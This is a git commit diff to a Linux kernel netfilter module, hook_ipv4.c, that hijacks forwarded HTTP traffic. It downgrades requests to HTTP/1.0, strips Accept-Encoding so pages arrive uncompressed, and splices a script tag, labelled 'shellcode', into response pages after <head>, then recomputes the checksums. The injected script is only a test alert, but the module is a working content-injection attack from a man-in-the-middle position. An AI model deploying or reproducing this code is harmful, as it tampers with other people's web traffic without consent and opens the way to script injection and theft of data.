8077fc8a642f8c38d8303441d6b8d412dbe01f2a
songboyu <soongboyu@gmail.com>
2016-08-29 02:56:01 +0800

    fix complete

--- hook_ipv4.c
+++ hook_ipv4.c
@@ -12,6 +12,7 @@
 #include <net/ip.h>
 #include <net/tcp.h>
 
+#include <net/checksum.h>
 #include <net/netfilter/nf_conntrack.h>
 #include <net/netfilter/nf_conntrack_helper.h>
 // #include <net/netfilter/nf_conntrack_expect.h>
@@ -19,7 +20,67 @@
 // #include <net/netfilter/nf_nat_core.h>
 #include <net/netfilter/nf_nat_helper.h>
 
-char shellcode[] = "<head>\n<script>alert('-----hijacking test----')</script>";
+char shellcode[] = "<head>\n<script>alert('hijacking test')</script>";
+
+// typedef struct Pseudo_Header {
+// 	unsigned int saddr;
+// 	unsigned int daddr;
+// 	unsigned char res;
+// 	unsigned char proto;
+// 	unsigned short len;
+// }pse_hd;
+
+// unsigned short checksum(unsigned short *addr, int len) {
+// 	int nleft = len;
+// 	int sum = 0;
+
+// 	uint16_t * w = addr;
+// 	uint16_t answer = 0;
+
+// 	while (nleft > 1) {
+// 		sum += *w++;
+// 		nleft -= sizeof(uint16_t);
+// 	}
+
+// 	if (nleft == 1) {
+// 		*(uint8_t *) (&answer) = *(uint8_t *) w;
+// 		sum += answer;
+// 	}
+
+// 	sum = (sum >> 16) + (sum & 0xFFFF);
+// 	sum += (sum >> 16);
+// 	answer = ~sum;
+// 	return (answer);
+// }
+
+// unsigned short checksum_tcp(struct iphdr *ip_hd, struct tcphdr *tcp_hd)
+// {
+// 	unsigned short tcp_len;
+// 	unsigned short ret = 0;
+// 	unsigned short ip_len = 0;
+// 	char *buf = NULL;
+// 	ip_len = (ip_hd->ihl & 0x0f) * 4;
+// 	tcp_len = ntohs(ip_hd->tot_len) - ((ip_hd->ihl & 0x0f) * 4);
+// 	buf = kmalloc(tcp_len + sizeof(pse_hd), GFP_KERNEL);
+// 	if(buf == NULL)
+// 	{
+// 		printk(KERN_ALERT "hook_ipv4: Error in malloc mem\n");
+// 		return 0;
+// 	}
+
+// 	pse_hd *phd = (pse_hd *)buf;
+// 	phd->saddr = ip_hd->saddr;
+// 	phd->daddr = ip_hd->daddr;
+// 	phd->res = 0;
+// 	phd->proto = IPPROTO_TCP;
+// 	phd->len = htons(tcp_len);
+// 	memcpy(buf+sizeof(pse_hd),tcp_hd,tcp_len);
+// 	tcp_hd = (struct tcphdr *)(buf+sizeof(pse_hd));
+// 	tcp_hd->check = 0;
+// 	ret = checksum((unsigned short *)buf, tcp_len+sizeof(pse_hd));
+// 	kfree(buf);
+// 	return ret; 
+// }
 
 int delete_accept_encoding(char *pkg)
 {
@@ -68,19 +129,20 @@ int delete_accept_encoding(char *pkg)
 // 	len = (long long)pV - (long long)pK;
 	
 	
-// 	memset(pK,' ',len + 2);
-// 	// memcpy(pK+18, "identity", 8);
+// 	// memset(pK,' ',len + 2);
+// 	memcpy(pK+18, "identity", 8);
 
-// 	// printk(KERN_ALERT "hook_ipv4: Delete Transfer-Encoding: \n%s\n",pK);
+// 	printk(KERN_ALERT "hook_ipv4: Delete Transfer-Encoding: \n%s\n",pK);
 
 // 	return 1;
 // }
 
 unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
 {
+	if (0 != skb_linearize(skb)) {
+        return NF_ACCEPT;
+    }
 	struct iphdr *iph = ip_hdr(skb);
-	unsigned short iph_len = ip_hdrlen(skb);
-	unsigned short tol_len = ntohs(iph->tot_len);
 
 	if (iph->protocol == IPPROTO_TCP)
 	{	
@@ -91,12 +153,14 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 		unsigned int src_port = (unsigned int)ntohs(tcph->source);
 		unsigned int dest_port = (unsigned int)ntohs(tcph->dest);
 		// printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &src_ip, src_port, &dest_ip, dest_port);
-
-		// if (0 != skb_linearize(skb)) {
-  //           return NF_ACCEPT;
-  //       }
+		
 		// char *pkg = (char *)((long long)tcph + ((tcph->doff) * 4));
 		char *pkg = (char *)skb->data + 40;
+
+		// HTTP 1.1 --> HTTP 1.0
+		char *pK = strstr(pkg,"HTTP/1.1");
+		if(pK == NULL) return NF_ACCEPT;
+		memcpy(pK, "HTTP/1.0", 8);
 
 		if (src_port == 80)
 		{
@@ -109,7 +173,7 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 			if(phead == NULL){
 				return NF_ACCEPT;
 			}
-			
+
 			enum ip_conntrack_info ctinfo;
 			struct nf_conn *ct = nf_ct_get(skb, &ctinfo);
 			// delete_transfer_encoding(pkg);
@@ -118,13 +182,14 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 			// printk(KERN_ALERT "%s\n", pkg+strlen(pkg)-20);
 			// printk(KERN_ALERT "---hook_ipv4: Found Head tag---\n");
 			// sudo iptables -t nat --list
-			if (ct && nf_nat_mangle_tcp_packet(skb, ct, ctinfo,iph_len,
-                                        phead - pkg, 6,
+			if (ct && nf_nat_mangle_tcp_packet(skb, ct, ctinfo, iph->ihl * 4,
+                                        (int)(phead - pkg), 6,
                                         shellcode, strlen(shellcode))) 
 			{
-                skb->local_df = 0;
+                skb->local_df = 1;
             	// skb_shinfo(skb)->gso_size = 0;
-                printk("---insert success---\n");
+
+                printk(KERN_ALERT "hook_ipv4: ---insert success---\n");
             }
             // kfree(pkg);
 
@@ -132,7 +197,7 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
             // pkg = (char *)skb->data + 40;
             // printk(KERN_ALERT "---pkg size2: %d\n", strlen(pkg));
 			// printk(KERN_ALERT "%s\n", pkg+strlen(pkg)-20);
-			/////////////////////change chunk size////////////////////////
+			///////////////////change chunk size////////////////////////
 			// char *pr1 = strstr(pkg,"<");
 			// char *pr2 = pr1 - 2; 
 			// pr1 -= 3;
@@ -158,7 +223,7 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 
 			// memcpy(pr1, chunk_size_str, strlen(chunk_size_str));
 			// kfree(chunk_size_str);
-			//////////////////////////////////////////////////////////////
+			////////////////////////////////////////////////////////////
 			
 			// char content_len[256];
 			// sprintf(content_len,"\r\n%s%d\r\n","Content-Length: ", 2000);
@@ -174,43 +239,43 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
    //          	// printk(KERN_ALERT "%s\n",pK);
    //          }
 
+   //          printk(KERN_ALERT "%d\n", skb->len);
+            
+   //          char content_len[256];
+			// sprintf(content_len,"\r\n%s%d\r\n","Content-Length: ", 200);
+
+			// char *pK = strstr(pkg,"Content-Type:");
+			// pK = strstr(pK,"\r\n");
+			// if(pK == NULL)
+			// 	return NF_ACCEPT;
+			// if (ct && nf_nat_mangle_tcp_packet(skb, ct, ctinfo, iph->ihl * 4,
+   //                                      pK - pkg, 2,
+   //                                      content_len, strlen(content_len))) 
+			// {
+   //          	printk(KERN_ALERT "hook_ipv4: ---fix Content-Length success---\n");
+   //          }
 		}
 		else if (dest_port == 80)
 		{
-			// char *pK = strstr(pkg,"HTTP/1.1");
-			// if(pK == NULL)
-			// 	return NF_ACCEPT;
-			// memcpy(pK, "HTTP/1.0", 8);
-
 			if (memcmp(pkg,"GET",strlen("GET")) != 0)
 			{
 				return NF_ACCEPT;
 			}
 
 			delete_accept_encoding(pkg);
+
+			// checksum
+			// skb
+            skb->ip_summed = CHECKSUM_PARTIAL;
+            skb->csum_start = skb_headroom(skb)+ skb_network_offset(skb) + iph->ihl * 4;
+            skb->csum_offset = offsetof(struct tcphdr, check);
+            // ip
+            iph->check = 0;
+            iph->check = ip_fast_csum(iph, iph->ihl);
+            // tcp
+            tcph->check = 0;
+            tcph->check = ~tcp_v4_check(skb->len-iph->ihl*4, iph->saddr, iph->daddr, 0);
 		}
-		// unsigned short cs = checksum_tcp(iph, tcph);
-		// tcph->check = cs;
-		struct rtable *rt = skb_rtable(skb);
-        int datalen = skb->len - iph->ihl * 4;
-        int oldlen = datalen - strlen(shellcode);
-        if (skb->ip_summed != CHECKSUM_PARTIAL) {
-            if (!(rt->rt_flags & RTCF_LOCAL) && skb->dev->features
-                    & NETIF_F_V4_CSUM) {
-                skb->ip_summed = CHECKSUM_PARTIAL;
-                skb->csum_start = skb_headroom(skb)
-                        + skb_network_offset(skb) + iph->ihl * 4;
-                skb->csum_offset = offsetof(struct tcphdr, check);
-                tcph->check = ~tcp_v4_check(datalen, iph->saddr,
-                        iph->daddr, 0);
-            } else {
-                tcph->check = 0;
-                tcph->check = tcp_v4_check(datalen, iph->saddr,
-                        iph->daddr, csum_partial(tcph, datalen, 0));
-            }
-        } else
-            inet_proto_csum_replace2(&tcph->check, skb, htons(oldlen),
-                    htons(datalen), 1);
 	}
 	return NF_ACCEPT;
 }
@@ -218,7 +283,8 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 static struct nf_hook_ops http_hooks = 
 { 
 	.pf = NFPROTO_IPV4,
-    .priority = NF_IP_PRI_MANGLE, 
+    // .priority = NF_IP_PRI_MANGLE, 
+    .priority = NF_IP_PRI_CONNTRACK_DEFRAG, 
     .hooknum = NF_INET_FORWARD, 
     .hook = hook_func,
 };
